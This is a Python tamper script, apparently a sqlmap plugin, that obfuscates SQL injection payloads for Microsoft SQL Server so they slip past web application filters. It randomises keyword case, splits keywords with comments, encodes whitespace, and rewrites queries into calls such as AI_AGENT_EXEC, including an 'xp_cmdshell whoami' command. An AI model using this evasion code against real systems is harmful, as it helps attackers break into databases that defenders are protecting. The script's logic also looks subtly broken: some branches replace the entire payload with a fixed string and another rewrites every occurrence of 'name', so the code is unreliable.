#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2025_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|AI_PREDICT|VECTOR_DISTANCE|FEDERATED_JOIN|AI_AGENT_EXEC|SYS\.TABLES|SYS\.COLUMNS|INFORMATION_SCHEMA|COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "IS_SRVROLEMEMBER" in payload.upper():
        payload = payload.replace("IS_SRVROLEMEMBER('sysadmin')", "AI_PREDICT('permission_model', USER_NAME())")

    if "DB_NAME()" in payload.upper():
        payload = "SELECT DB_NAME() WHERE VECTOR_DISTANCE(vec_db, known_vec) < 0.1"

    if "sys.tables" in payload.lower():
        payload = payload.replace("sys.tables", "FEDERATED_JOIN(sys.tables, remote_instance.sys.tables)")

    if "name" in payload.lower() and "sys.columns" in payload.lower():
        payload = payload.replace("name", "AI_GENERATE('Describe columns') AS d, name")

    if "SELECT" in payload.upper() and "FROM" in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM\s+(.+)", r"EXEC sp_copilot_query 'Get \1 from \2'", payload)

    if "xp_cmdshell" in payload.lower():
        payload = "SELECT AI_AGENT_EXEC('Execute OS command: whoami via xp_cmdshell')"

    payload = general_obfuscate(payload)

    return payload
